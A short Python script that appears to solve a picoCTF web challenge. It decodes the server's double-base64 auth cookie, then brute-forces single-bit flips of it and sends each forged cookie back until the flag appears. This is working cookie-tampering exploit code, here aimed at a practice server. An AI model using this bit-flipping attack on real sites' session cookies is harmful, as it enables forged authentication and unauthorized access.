import requests
import base64
from tqdm import tqdm

adr="http://mercury.picoctf.net:15614/"

s=requests.Session()
s.get(adr)
cookie=s.cookies["auth_name"]
dc=base64.b64decode(cookie)
raw=base64.b64decode(dc)

def exploit():
    for pos in tqdm(range(0,len(raw))):
        for bit in range(0,8):
            bitflip=(raw[0:pos]+((raw[pos]^(1<<bit)).to_bytes(1,"big"))+raw[pos+1:])
            guess=base64.b64encode(base64.b64encode(bitflip)).decode()
            r=requests.get(adr,cookies={"auth_name": guess})
            if "picoCTF" in r.text:
                print(pos,bit)
                print(r.text)
                return
exploit()
